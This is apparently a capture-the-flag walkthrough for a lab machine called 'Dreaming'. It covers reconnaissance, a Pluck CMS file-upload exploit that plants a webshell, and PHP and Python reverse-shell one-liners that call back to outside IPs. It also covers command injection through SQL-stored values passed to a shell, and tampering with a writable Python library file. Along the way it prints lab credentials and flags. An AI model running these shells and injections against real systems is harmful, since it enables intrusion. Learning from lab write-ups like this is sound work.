
---

# Dreaming

IP = `10.10.142.1`

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

```
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/app                  (Status: 301) [Size: 308] [--> http://10.10.142.1/app/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
```

found `[DIR]	pluck-4.7.13/` in http://10.10.142.1/app/

### Searchsploit

```
# searchsploit pluck
-------------------------- ---------------------------------
 Exploit Title            |  Path
-------------------------- ---------------------------------
--SNIP
Pluck CMS 4.7.13 - File U | php/webapps/49909.py
--SNIP--
-------------------------- ---------------------------------
```


### Initial Foothold

```
$ python3 49909.py 10.10.142.1 80 password /app/pluck-4.7.13/

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.142.1:80/app/pluck-4.7.13//files/shell.phar
```

password `password` got by checking random passwords.



### priv Esc

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
`nc -lnvp 9999`

##### users

```
death
lucien
morpheus
```

in `/opt` directory

```
www-data@dreaming:/opt$ cat test.py
--SNIP--
#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
--SNIP--
www-data@dreaming:/opt$
```

#### Found Creds

`lucien`:`HeyLucien#@1999!`

Got user!

**lucien_flag.txt**

`THM{TH3_L1BR4R14N}`

```
lucien@dreaming:/opt$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

```

`-rwxrwx--x 1 death death 1539 Aug 25  2023 getDreams.py`

#### LinPeas

```
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31
```

```
# searchsploit sudo 1.8
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
--SNIP--
sudo 1.8.0 to 1.9.12p1 - Privilege Escalation               | linux/local/51217.sh
--SNIP--
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Not working as expected

```
$ chmod +x 51217.sh
lucien@dreaming:/dev/shm$ ls
51217.sh  linpeas.log  linpeas.sh
lucien@dreaming:/dev/shm$ ./51217.sh
> It doesn't seem that this user can run sudoedit as root
Do you want to proceed anyway? (y/N): y
lucien@dreaming:/dev/shm$
```


in `lucien/.bash_history`

```
--SNIP--
mysql -u lucien -plucien42DBPASSWORD
--SNIP--
```

```
lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

/home/death/getDreams.py isn't readable by lucien,
but /opt/getDreams.py is readable

```
lucien@dreaming:~$ cat /opt/getDreams.py
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()

```

we already the lucien's credential for mysql

may be we can change the DB `library` to get death user,
`/home/lucien/getDreams.py` in death can be executed by lucien with password of death

```
> show databses;
> use library;
> show tables;
> select * from dreams;

+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+

> UPDATE dreams SET dream = '/bin/bash' WHERE dream = 'Flying in the sky';

> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | /bin/bash                          |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+

> UPDATE dreams SET dream = '$(/bin/bash)' WHERE dream = '/bin/bash';

```

Got daeth user

```
lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
death@dreaming:/home/lucien$
```

but commands isn't returning anything

```
death@dreaming:~$ ls -la
death@dreaming:~$ ls -la ..
death@dreaming:~$ clear
death@dreaming:~$ cat /opt/getDreams.py
death@dreaming:~$ id
```

`> UPDATE dreams SET dream = '$(cat /home/death/getDreams.py)' WHERE dream = '$(/bin/bash)';`

```
lucien@dreaming:/home/death$ sudo -u death /usr/bin/python3 /home/death/getDreams.py

Alice + import mysql.connector import subprocess # MySQL credentials DB_USER = "death" DB_PASS = "!mementoMORI666!" DB_NAME = "library" def getDreams(): try: # Connect to the MySQL database connection = mysql.connector.connect( host="localhost", user=DB_USER, password=DB_PASS, database=DB_NAME ) # Create a cursor object to execute SQL queries cursor = connection.cursor() # Construct the MySQL query to fetch dreamer and dream columns from dreams table query = "SELECT dreamer, dream FROM dreams;" # Execute the query cursor.execute(query) # Fetch all the dreamer and dream information dreams_info = cursor.fetchall() if not dreams_info: print("No dreams found in the database.") else: # Loop through the results and echo the information using subprocess for dream_info in dreams_info: dreamer, dream = dream_info command = f"echo {dreamer} + {dream}" shell = subprocess.check_output(command, text=True, shell=True) print(shell) except mysql.connector.Error as error: # Handle any errors that might occur during the database connection or query execution print(f"Error: {error}") finally: # Close the cursor and connection cursor.close() connection.close() # Call the function to echo the dreamer and dream information getDreams()

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

lucien@dreaming:/home/death$

```


Got Password for death user

`death` : `!mementoMORI666!`


**death_flag**

`THM{1M_TH3R3_4_TH3M}`

### Pwning morpheus

nothing for sudo -l

nothing interesting for `find / -perm -4000 2>/dev/null`

nothing interesting got `death@dreaming:/home$ find / -type f -user death 2>/dev/null`

for `death@dreaming:/home$ find / -type f -group death 2>/dev/null`
we found
```
--SNIP--
/usr/lib/python3.8/shutil.py
/opt/getDreams.py
--SNIP--
```

we have already explored `/opt/getDreams.py`

we have write permission to `/usr/lib/python3.8/shutil.py`

```
death@dreaming:/home$ ls -la /usr/lib/python3.8/shutil.py
-rw-rw-r-- 1 root death 51474 Aug  7  2023 /usr/lib/python3.8/shutil.py
```

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.101.54",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

`nc -lnvp 9999`

Got Shell

```
morpheus@dreaming:~$ id
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
```

**morpheus_flag.txt**

`THM{DR34MS_5H4P3_TH3_W0RLD}`

**kingdom**

`We saved the kingdom!`